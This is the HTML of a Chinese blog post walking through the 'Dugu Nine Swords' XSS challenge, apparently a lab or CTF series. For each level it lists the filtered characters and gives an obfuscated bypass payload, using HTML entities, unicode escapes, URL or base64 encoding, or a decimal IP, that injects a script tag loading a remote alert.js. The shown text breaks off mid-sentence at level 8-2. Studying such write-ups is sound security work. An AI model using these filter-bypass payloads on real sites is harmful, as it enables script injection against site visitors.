@@ -1,0 +1,744 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="儒道易行">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="独孤九剑xss通关教程独孤九剑第一式： 这里过滤了 &#x3D;() 构造payload： 123?data&#x3D;&quot;&gt;&lt;svg&gt;&lt;script&gt;%26%23x65%3B%26%23x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3B%26%23x61%3B%2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="独孤九剑xss通关教程">
+<meta property="og:url" content="http://rdyx0.github.io/2019/10/23/%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91xss%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/index.html">
+<meta property="og:site_name" content="儒道易行">
+<meta property="og:description" content="独孤九剑xss通关教程独孤九剑第一式： 这里过滤了 &#x3D;() 构造payload： 123?data&#x3D;&quot;&gt;&lt;svg&gt;&lt;script&gt;%26%23x65%3B%26%23x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3B%26%23x61%3B%2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/61e7b399e78540ff9cc08233c07f4408.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7e213bbb768d4ef6b54b35ca91e95d8a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/37d4ecf2c3244195bb9b6a9ac86123ea.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/59f368ecb2dc4945b449978999aa81f4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/80097602d76a400185c1046bdcf458dc.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b6f1f93ef73d4d9799495ad4c6ef932b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ec0a843575134035bca16faf94d09453.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/11001c8f92044ae88541b2e14b396d59.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7f3f8e6d5de4442ba6eeeff181f85344.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/021ab9411166411d95e53ba71178f00b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/92e6f1b39dc949f7bb0531cb840981fb.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2cf469448a21415b98fb98969647b999.png">
+<meta property="article:published_time" content="2019-10-23T13:36:15.000Z">
+<meta property="article:modified_time" content="2023-01-01T03:02:53.294Z">
+<meta property="article:author" content="儒道易行">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/61e7b399e78540ff9cc08233c07f4408.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>独孤九剑xss通关教程 - 儒道易行</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rdyx0.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>儒道易行</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="独孤九剑xss通关教程"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-10-23 21:36" pubdate>
+          2019年10月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          54 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">独孤九剑xss通关教程</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="独孤九剑xss通关教程"><a href="#独孤九剑xss通关教程" class="headerlink" title="独孤九剑xss通关教程"></a>独孤九剑xss通关教程</h1><h2 id="独孤九剑第一式："><a href="#独孤九剑第一式：" class="headerlink" title="独孤九剑第一式："></a><strong>独孤九剑第一式：</strong></h2><p> 这里过滤了 &#x3D;()</p>
+<p>构造payload：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">?data=&quot;&gt;&lt;svg&gt;&lt;script&gt;<span class="hljs-variable">%26%</span>23x65<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x76%</span>3B<span class="hljs-variable">%26%</span>23x61<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x6c%</span>3B<span class="hljs-variable">%26%</span>23x28<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x6c%</span>3B<span class="hljs-variable">%26%</span>23x6f<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x63%</span>3B<span class="hljs-variable">%26%</span>23x61<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x74%</span>3B<span class="hljs-variable">%26%</span>23x69<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x6f%</span>3B<span class="hljs-variable">%26%</span>23x6e<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x2e%</span>3B<span class="hljs-variable">%26%</span>23x68<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x61%</span>3B<span class="hljs-variable">%26%</span>23x73<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x68%</span>3B<span class="hljs-variable">%26%</span>23x2e<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x73%</span>3B<span class="hljs-variable">%26%</span>23x6c<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x69%</span>3B<span class="hljs-variable">%26%</span>23x63<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x65%</span>3B<span class="hljs-variable">%26%</span>23x28<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x31%</span>3B<span class="hljs-variable">%26%</span>23x29<span class="hljs-variable">%3B%</span>26<span class="hljs-variable">%23x29%</span>3B&lt;/script&gt;&lt;/svg&gt;#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://xcao.vip/test/alert.js&#x27;<br><br>?data=1<span class="hljs-variable">%22%</span>3E<span class="hljs-variable">%3Cscript%</span>3Edocument.write` <span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u003d</span><span class="hljs-symbol">\u0022</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u003a</span><span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u006f</span><span class="hljs-symbol">\u002e</span><span class="hljs-symbol">\u0076</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u0061</span><span class="hljs-symbol">\u006c</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u002e</span><span class="hljs-symbol">\u006a</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0022</span><span class="hljs-symbol">\u003e</span> <span class="hljs-symbol">\u002f</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u003e</span>`%3C/script<span class="hljs-variable">%3E%</span>3C!--)<br></code></pre></td></tr></table></figure>
+
+<p>解码后就是这样，这里是因为在 svg 下面的 script 可以使用 html 编码，利用 html 编码绕过&#x3D;() 的过滤 </p>
+<p>?data&#x3D;”&gt;#with (document)body.appendChild(createElement(‘script’)).src&#x3D;’<a target="_blank" rel="noopener" href="http://127.0.0.1/xss/alert.js&#39;">http://127.0.0.1/xss/alert.js&#39;</a></p>
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/61e7b399e78540ff9cc08233c07f4408.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="独孤九剑第二式："><a href="#独孤九剑第二式：" class="headerlink" title="独孤九剑第二式："></a><strong>独孤九剑第二式：</strong></h2><p>这里过滤了 &#x3D;(). 新增了.的过滤 利用 setTimeout 以及&#96;&#96;代替括号，同时采用\u 编码绕过对()和.的限制</p>
+<p>构造payload：</p>
+<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r">http<span class="hljs-operator">:</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>xcao.vip<span class="hljs-operator">/</span>test<span class="hljs-operator">/</span>xss2.php<span class="hljs-operator">?</span>data<span class="hljs-operator">=</span>xxx<span class="hljs-operator">%22%</span><span class="hljs-number">3</span>E<span class="hljs-operator">%3Cscript%</span><span class="hljs-number">3</span>EsetTimeout`\u0065\u0076 \u0061\u006c\u0028\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u002e\u0068\ u0061\u0073\u0068\u002e\u0073\u006c\u0069\u0063\u0065\u0028\u0031\u0029\u0029 `;<span class="hljs-operator">%3C/script%</span><span class="hljs-number">3</span>E<span class="hljs-comment">#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;ht tp://xcao.vip/xss/alert.js&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/7e213bbb768d4ef6b54b35ca91e95d8a.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="独孤九剑第三式："><a href="#独孤九剑第三式：" class="headerlink" title="独孤九剑第三式："></a><strong>独孤九剑第三式：</strong></h2><p>过滤了 ().&amp;#\ 注意和第二题的不同，放开了&#x3D;的过滤，新增了&amp;#\的过滤</p>
+<p>没有过滤&#x3D;了，可以直接用 script 加载，然后利用%2e URL 编码绕过对点号的过滤</p>
+<p>构造payload：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xcao.vip/test/xss3.php?data=%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">20</span>src=http://xcao%<span class="hljs-number">252</span>evip/xs s/alert%<span class="hljs-number">252</span>ejs%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C/script%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/37d4ecf2c3244195bb9b6a9ac86123ea.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="独孤九剑第四式："><a href="#独孤九剑第四式：" class="headerlink" title="独孤九剑第四式："></a><strong>独孤九剑第四式：</strong></h2><p>过滤了 &#x3D;().&amp;#\</p>
+<p>%编码还能用，可以使用 javascript 伪协议+URL 编码的方法，使用 location.replace 方法引入 javascript 协议，由于 location.replace 里面的参数是连接， 里面必然可以使用 URL 编码，因此顺利绕过，把().分别用 %2528 %2529 %252e 编码，因为 location 是 URL,因此后自动解码 URL 编码。</p>
+<p>利用iframe标签然后配合base64编码的js加载</p>
+<p>构造payload：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xcao.vip/test/xss4.php?data=<span class="hljs-number">1</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Etop[%<span class="hljs-number">22</span>document%<span class="hljs-number">22</span>][%<span class="hljs-number">22</span>write%<span class="hljs-number">22</span>]`<span class="hljs-variable">$&#123;top[<span class="hljs-number">%22</span>String<span class="hljs-number">%22</span>][<span class="hljs-number">%22</span>fromCharCode<span class="hljs-number">%22</span>]`61`<span class="hljs-number">%2</span>b<span class="hljs-number">%22</span>data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcz48L3NjcmlwdD4=<span class="hljs-number">%3</span>E111<span class="hljs-number">%3</span>C/iframe<span class="hljs-number">%3</span>E<span class="hljs-number">%22</span>&#125;</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>Ciframe%<span class="hljs-number">20</span>src`%<span class="hljs-number">3</span>C/script%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C!--<br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/59f368ecb2dc4945b449978999aa81f4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="独孤九剑第五式："><a href="#独孤九剑第五式：" class="headerlink" title="独孤九剑第五式："></a><strong>独孤九剑第五式：</strong></h2><p>过滤了 ().&amp;#% 这里和第四题的区别是新增了%的过滤，同时不再过滤&#x3D;，因为和第三题比较只是多了一个%的过滤，因此沿用第三题的思路，这里想到了一个 IP 十进制的方法，把 IP 地址转换成十进制不就没.了吗。 alert.js 好处理，可以用自己的一个域名跳转到目标域名，自己域名链接不要带.就行</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xquery">http://xcao.vip/test/xss5.php?data=<span class="hljs-meta">%22</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%3Cscript</span><span class="hljs-meta">%20src</span>=http://<span class="hljs-number">2067398186</span>/xxx% <span class="hljs-number">3</span>E<span class="hljs-meta">%3C</span>/script<span class="hljs-meta">%3E</span> <br><br>构造payload： <br><br>http://xcao.vip/test/xss5.php?data=<span class="hljs-number">1</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%3Cscript</span><span class="hljs-meta">%3Etop</span>[<span class="hljs-meta">%22document</span><span class="hljs-meta">%22</span>][<span class="hljs-meta">%22write</span><span class="hljs-meta">%22</span>]`$&#123;top[<span class="hljs-meta">%22String</span><span class="hljs-meta">%22</span>][<span class="hljs-meta">%22fromCharCode</span><span class="hljs-meta">%22</span>]`<span class="hljs-number">61</span>`<span class="hljs-meta">%2b</span><span class="hljs-meta">%22data:text</span>/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcz48L3NjcmlwdD4=<span class="hljs-meta">%3E111</span><span class="hljs-meta">%3C</span>/iframe<span class="hljs-meta">%3E</span><span class="hljs-meta">%22</span>&#125;<span class="hljs-meta">%20</span><span class="hljs-meta">%3Ciframe</span><span class="hljs-meta">%20src</span>`<span class="hljs-meta">%3C</span>/script<span class="hljs-meta">%3E</span><span class="hljs-meta">%3C</span>!--<br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/80097602d76a400185c1046bdcf458dc.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="独孤九剑第六式："><a href="#独孤九剑第六式：" class="headerlink" title="独孤九剑第六式："></a><strong>独孤九剑第六式：</strong></h2><p> 过滤了 &#x3D;().&amp;#% </p>
+<p>构造payload： </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xcao.vip/test/xss6.php?data=<span class="hljs-number">1</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Etop[%<span class="hljs-number">22</span>document%<span class="hljs-number">22</span>][%<span class="hljs-number">22</span>write%<span class="hljs-number">22</span>]`<span class="hljs-variable">$&#123;top[<span class="hljs-number">%22</span>String<span class="hljs-number">%22</span>][<span class="hljs-number">%22</span>fromCharCode<span class="hljs-number">%22</span>]`61`<span class="hljs-number">%2</span>b<span class="hljs-number">%22</span>data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcz48L3NjcmlwdD4=<span class="hljs-number">%3</span>E111<span class="hljs-number">%3</span>C/iframe<span class="hljs-number">%3</span>E<span class="hljs-number">%22</span>&#125;</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>Ciframe%<span class="hljs-number">20</span>src`%<span class="hljs-number">3</span>C/script%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C!--<br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/b6f1f93ef73d4d9799495ad4c6ef932b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>另外的payload：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xcao.vip/test/xss6.php?data=%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Ciframe%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C/iframe%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Ef rames[<span class="hljs-number">0</span>][%<span class="hljs-number">22</span>location%<span class="hljs-number">22</span>][%<span class="hljs-number">22</span>replace%<span class="hljs-number">22</span>]`data:text/html;base64,PHNjcmlwdCBzcmM9a HR0cHM6Ly9ldmlsNy5jbi90ZXN0L3hzcy5qcz48L3NjcmlwdD4`%<span class="hljs-number">3</span>C/script%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/ec0a843575134035bca16faf94d09453.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="独孤九剑第七式："><a href="#独孤九剑第七式：" class="headerlink" title="独孤九剑第七式："></a><strong>独孤九剑第七式：</strong></h2><p>过滤了 &#x3D;().&amp;#%&lt;&gt;，输入点在js里</p>
+<p>将&#x3D;，&lt;，&gt;进行ascii编码，有效载荷稍作修改即可</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://xcao.vip/test/xss7.php?data=%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>;top[%<span class="hljs-number">22</span>document%<span class="hljs-number">22</span>][%<span class="hljs-number">22</span>write%<span class="hljs-number">22</span>]`<span class="hljs-variable">$&#123;top[<span class="hljs-number">%22</span>String<span class="hljs-number">%22</span>][<span class="hljs-number">%22</span>fromCharCode<span class="hljs-number">%22</span>]`60`<span class="hljs-number">%2</span>b<span class="hljs-number">%22</span>iframe<span class="hljs-number">%20</span>src<span class="hljs-number">%22</span><span class="hljs-number">%2</span>btop[<span class="hljs-number">%22</span>String<span class="hljs-number">%22</span>][<span class="hljs-number">%22</span>fromCharCode<span class="hljs-number">%22</span>]`61`<span class="hljs-number">%2</span>b<span class="hljs-number">%22</span>data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcz48L3NjcmlwdD4=<span class="hljs-number">%22</span><span class="hljs-number">%2</span>btop[<span class="hljs-number">%22</span>String<span class="hljs-number">%22</span>][<span class="hljs-number">%22</span>fromCharCode<span class="hljs-number">%22</span>]`62`&#125;</span>`<br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/11001c8f92044ae88541b2e14b396d59.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>构造payload：用 hash 保存工具向量</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://xcao.vip/test/xss7.php/?data=1;</span>[<span class="hljs-string"></span>][<span class="hljs-string">&#x27;constructor&#x27;</span>][<span class="hljs-string">&#x27;constructor&#x27;</span>]<span class="hljs-string">`a$&#123;locat ion[&#x27;</span>hash&#x27;][<span class="hljs-emphasis">&#x27;slice&#x27;</span>]<span class="hljs-string">`1`&#125;```#with(document)body.appendChild(createElement(&#x27;</span>scrip t&#x27;)).src=<span class="hljs-emphasis">&#x27;http://xcao.vip/xss/alert.js&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/7f3f8e6d5de4442ba6eeeff181f85344.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="独孤九剑第八式："><a href="#独孤九剑第八式：" class="headerlink" title="独孤九剑第八式："></a><strong>独孤九剑第八式：</strong></h2><p>过滤了 &#x3D;().&amp;#%&lt;&gt;’”[]，新增’”[]的过滤。 </p>
+<p>利用 base64</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">http:</span>//xcao.vip/test/xss8.php?data=Function`b$&#123;atob`ZG9jdW1lbnQud3JpdGUoIjxzY3J pcHQgc3JjPScveHNzL2FsZXJ0LmpzJz48L3NjcmlwdD4iKQ`&#125;``` <br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/021ab9411166411d95e53ba71178f00b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="独孤九剑第八-1-式："><a href="#独孤九剑第八-1-式：" class="headerlink" title="独孤九剑第八-1 式："></a><strong>独孤九剑第八-1 式：</strong></h2><p>过滤了 &#x3D;().&amp;#%&lt;&gt;’”{}，新增{}的过滤。 放开[]的使用权，没有了{}就没法使用 js 模板了，那攻击向量存哪儿呢？ Function&#96;name&#96;&#96;&#96;肯定是不行的 但是别忘了万能的伪协议</p>
+<p>base64</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">http:</span>//xcao.vip/test/xss8-<span class="hljs-number">1</span>.php?data=atob`ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjP ScveHNzL2FsZXJ0LmpzJz48L3NjcmlwdD4iKQ`;location[`replace`]`javascript:a` <br></code></pre></td></tr></table></figure>
+
+<p>成功通关</p>
+<p><img src="https://img-blog.csdnimg.cn/92e6f1b39dc949f7bb0531cb840981fb.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="独孤九剑第八-2-式："><a href="#独孤九剑第八-2-式：" class="headerlink" title="独孤九剑第八-2 式："></a><strong>独孤九剑第八-2 式：</strong></h2><p>过滤了 &#x3D;().&amp;#%&lt;&gt;’”[] Function，相对于第 8 式新增 Function 的过滤（这是不是像极了 struts2 修复漏洞的方式）第八关的解法不能用[]和引号，那么是不是必须要在 window 下面另外找一个方法来替代 Funtion 呢？ setTimeout? open? 先看看 open 的参数 </p>
+<p>window.open(‘page.html’, ‘newwindow’, ‘height&#x3D;100, width&#x3D;400, top&#x3D;0, left&#x3D;0, to olbar&#x3D;no, menubar&#x3D;no, scrollbars&#x3D;no, resizable&#x3D;no, location&#x3D;no, status&#x3D;no’) </p>
+<p>如果我们能控制第二个参数就可以了，因为可以用</p>
